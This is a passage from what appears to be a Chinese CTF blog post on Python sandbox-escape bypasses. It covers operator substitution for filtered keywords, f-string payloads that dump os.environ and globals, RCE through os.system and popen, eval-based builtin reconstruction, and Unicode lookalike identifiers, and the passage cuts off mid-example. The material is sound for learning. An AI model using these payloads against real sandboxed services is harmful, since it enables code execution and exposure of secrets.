&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans = i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;#125;&lt;/span&gt; | &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)) == ans)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;- &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;#125;&lt;/span&gt; - &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)) == ans)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;#125;&lt;/span&gt; + &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)) == ans)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;and 可以用 &amp;amp; * 替代&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), (&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans = i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;#125;&lt;/span&gt; &amp;amp; &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)) == ans)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&amp;#125;&lt;/span&gt; * &lt;span class=&#34;subst&#34;&gt;&amp;#123;i[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]==i[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)) == ans)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了-4&#34;&gt;#&lt;/a&gt; 过滤了 ()&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;利用装饰器 @&lt;/li&gt;
&lt;li&gt;利用魔术方法，例如  &lt;code&gt;enum.EnumMeta.__getitem__&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;f-字符串执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#f-字符串执行&#34;&gt;#&lt;/a&gt; f 字符串执行&lt;/h4&gt;
&lt;p&gt;f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息，例如过去环境变量&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__class__.__dict__&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__globals__[os].__dict__&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__globals__[os].environ&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__globals__[sys].path&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__globals__[sys].modules&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Access an element through several links&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;也可以直接 RCE&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;)&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;__builtins__.&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).__dict__[&lt;span class=&#34;string&#34;&gt;&amp;#x27;popen&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;).read()&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;过滤了内建函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了内建函数&#34;&gt;#&lt;/a&gt; 过滤了内建函数&lt;/h4&gt;
&lt;h4 id=&#34;eval-list-dict-构造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval-list-dict-构造&#34;&gt;#&lt;/a&gt; eval + list + dict 构造&lt;/h4&gt;
&lt;p&gt;假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;bool&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;bool&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;st&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(s_t_r=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][::&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数。如果某个模块已经被导入了，则也可以获取这个模块中的函数。&lt;/p&gt;
&lt;h4 id=&#34;过滤了-和-如何获取函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了-和-如何获取函数&#34;&gt;#&lt;/a&gt; 过滤了。和 ，如何获取函数&lt;/h4&gt;
&lt;p&gt;通常情况下，我们会通过点号来进行调用 &lt;code&gt;__import__(&#39;binascii&#39;).a2b_base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者通过 getattr 函数： &lt;code&gt;getattr(__import__(&#39;binascii&#39;),&#39;a2b_base64&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果将，号和。都过滤了，则可以有如下的几种方式获取函数：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;内建函数可以使用 &lt;code&gt;eval(list(dict(s_t_r=1))[0][::2])&lt;/code&gt;  这样的方式获取。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模块内的函数可以先使用 &lt;code&gt;__import__&lt;/code&gt; 导入函数，然后使用 vars () j 进行获取：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;vars&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;binascii&amp;#x27;&lt;/span&gt;))[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a2b_base64&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;built-&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; function a2b_base64&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;unicode-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unicode-绕过&#34;&gt;#&lt;/a&gt; unicode 绕过&lt;/h4&gt;
&lt;p&gt;Python 3 开始支持非 ASCII 字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/09/KNHh3LtUlbfiruA.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;相似 unicode 寻找网站：&lt;a class=&#34;link&#34; href=&#34;http://shapecatcher.com/&#34;&gt;http://shapecatcher.com/ &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以通过绘制的方式寻找相似字符&lt;/p&gt;
&lt;p&gt;下划线可以使用对应的全角字符进行替换：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;＿&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;使用时注意第一个字符不能为全角，否则会报错：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(_＿name_＿)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__main__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(＿＿name_＿)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(＿＿name_＿)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          ^&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SyntaxError: invalid character &lt;span class=&#34;string&#34;&gt;&amp;#x27;＿&amp;#x27;&lt;/span&gt; (U+FF3F)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;需要注意的是，某些 unicode 在遇到 lower () 函数时也会发生变换，因此碰到 lower ()、upper () 这样的函数时要格外注意。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过命名空间限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过命名空间限制&#34;&gt;#&lt;/a&gt; 绕过命名空间限制&lt;/h3&gt;
&lt;h4 id=&#34;部分限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部分限制&#34;&gt;#&lt;/a&gt; 部分限制&lt;/h4&gt;
&lt;p&gt;有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span 